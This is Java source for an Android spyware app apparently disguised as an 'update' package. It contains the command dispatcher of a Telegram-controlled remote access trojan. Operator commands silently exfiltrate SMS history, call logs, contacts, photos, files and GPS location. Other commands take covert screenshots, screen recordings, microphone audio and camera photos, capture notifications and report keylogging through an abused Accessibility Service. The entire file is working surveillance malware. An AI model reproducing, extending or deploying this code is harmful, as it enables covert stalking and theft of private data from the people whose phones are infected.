package com.kasari.update;

import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class CommandProcessor {

    public static void handle(Context ctx, String text) {
        new Thread(() -> process(ctx, text)).start();
    }

    private static void process(Context ctx, String raw) {
        String cmd = raw.trim();
        String lower = cmd.toLowerCase();

        // ── Help ──────────────────────────────────────────────────────────
        if (lower.equals("/help")) {
            TelegramController.sendMessage(
                "📋 COMMANDS [" + BackgroundService.deviceId + "]\n\n" +
                "📱 Status:\n" +
                "/status — Device info\n" +
                "/apps — Installed apps list\n\n" +
                "💬 SMS:\n" +
                "/sms_all — All SMS history\n\n" +
                "📞 Calls:\n" +
                "/calllog — Last 100 calls\n\n" +
                "📒 Data:\n" +
                "/contacts — All contacts\n" +
                "/gallery [N] — Last N photos (default all)\n" +
                "/files [path] — Browse files\n\n" +
                "📍 Location:\n" +
                "/location — GPS + IP fallback\n\n" +
                "📸 Screen:\n" +
                "/screenshot — Silent screenshot\n" +
                "/screen_start [sec] — Repeat screenshot\n" +
                "/screen_stop — Stop repeat\n" +
                "/screen_record [sec] — MP4 recording\n\n" +
                "🎙 Audio:\n" +
                "/mic [sec] — Mic recording\n\n" +
                "📷 Camera:\n" +
                "/cam — Front camera photo\n" +
                "/cam_back — Rear camera photo\n\n" +
                "🔔 Live:\n" +
                "/notifications — Last 20 notifications\n"
            );

        // ── Status ────────────────────────────────────────────────────────
        } else if (lower.equals("/status")) {
            TelegramController.sendMessage(
                "📊 Device: [" + BackgroundService.deviceId + "]\n" +
                "Model: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
                "Android: " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")\n" +
                "Screen: " + (ScreenMirror.instance != null ? "✅ AccessibilityService ON" : "❌ AccessibilityService OFF") + "\n" +
                "Keylog: " + (ScreenMirror.instance != null ? "✅ ON" : "❌ OFF")
            );

        // ── SMS ───────────────────────────────────────────────────────────
        } else if (lower.equals("/sms_all")) {
            SmsForwarder.sendAllHistory(ctx);

        // ── Call log ──────────────────────────────────────────────────────
        } else if (lower.equals("/calllog")) {
            ContactGrabber.sendCallLog(ctx);

        // ── Contacts ──────────────────────────────────────────────────────
        } else if (lower.equals("/contacts")) {
            ContactGrabber.sendContacts(ctx);

        // ── Gallery ───────────────────────────────────────────────────────
        } else if (lower.startsWith("/gallery")) {
            int n = Integer.MAX_VALUE;
            String[] p = cmd.trim().split("\\s+");
            if (p.length > 1) { try { n = Integer.parseInt(p[1]); } catch (Exception ignored) {} }
            final int limit = n;
            new Thread(() -> FileExplorer.sendGallery(ctx, limit)).start();

        // ── Files ─────────────────────────────────────────────────────────
        } else if (lower.startsWith("/files")) {
            String path = "/sdcard";
            String[] p = cmd.trim().split("\\s+", 2);
            if (p.length > 1) path = p[1];
            FileExplorer.listDirectory(path);

        // ── Location ──────────────────────────────────────────────────────
        } else if (lower.equals("/location")) {
            new Thread(() -> LocationTracker.getLocation(ctx)).start();

        // ── Screenshot ────────────────────────────────────────────────────
        } else if (lower.equals("/screenshot")) {
            if (ScreenMirror.instance != null) {
                ScreenMirror.instance.requestCapture();
            } else {
                TelegramController.sendMessage("❌ Accessibility Service enable karo.\nSettings → Accessibility → Kasari Chauhan → ON");
            }

        } else if (lower.startsWith("/screen_start")) {
            int sec = 30;
            String[] p = cmd.trim().split("\\s+");
            if (p.length > 1) { try { sec = Integer.parseInt(p[1]); } catch (Exception ignored) {} }
            if (ScreenMirror.instance != null) {
                ScreenMirror.instance.startContinuous(sec);
            } else {
                TelegramController.sendMessage("❌ Accessibility Service enable karo.");
            }

        } else if (lower.equals("/screen_stop")) {
            if (ScreenMirror.instance != null) ScreenMirror.instance.stopContinuous();

        } else if (lower.startsWith("/screen_record")) {
            int sec = 30;
            String[] p = cmd.trim().split("\\s+");
            if (p.length > 1) { try { sec = Integer.parseInt(p[1]); } catch (Exception ignored) {} }
            if (ScreenMirror.instance != null) {
                Intent i = new Intent(ctx, ScreenRecordService.class);
                i.setAction(ScreenRecordService.ACTION_RECORD);
                i.putExtra(ScreenRecordService.EXTRA_SECONDS, sec);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    ctx.startForegroundService(i); else ctx.startService(i);
                TelegramController.sendMessage("🎬 Recording shuru... " + sec + "s baad MP4 aayega.");
            } else {
                TelegramController.sendMessage("❌ Accessibility Service enable karo.");
            }

        // ── Mic ───────────────────────────────────────────────────────────
        } else if (lower.startsWith("/mic")) {
            int sec = 30;
            String[] p = cmd.trim().split("\\s+");
            if (p.length > 1) { try { sec = Integer.parseInt(p[1]); } catch (Exception ignored) {} }
            Intent i = new Intent(ctx, VoiceRecorder.class);
            i.setAction(VoiceRecorder.ACTION_MIC);
            i.putExtra(VoiceRecorder.EXTRA_SECONDS, sec);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                ctx.startForegroundService(i); else ctx.startService(i);
            TelegramController.sendMessage("🎙 Mic recording " + sec + "s shuru...");

        // ── Camera ────────────────────────────────────────────────────────
        } else if (lower.equals("/cam")) {
            CameraCapture.capture(ctx, false);

        } else if (lower.equals("/cam_back")) {
            CameraCapture.capture(ctx, true);

        // ── Apps ──────────────────────────────────────────────────────────
        } else if (lower.equals("/apps")) {
            AppManager.sendInstalledApps(ctx);

        // ── Notifications ─────────────────────────────────────────────────
        } else if (lower.equals("/notifications")) {
            NotificationCatcher.sendRecent();
        }
    }
}
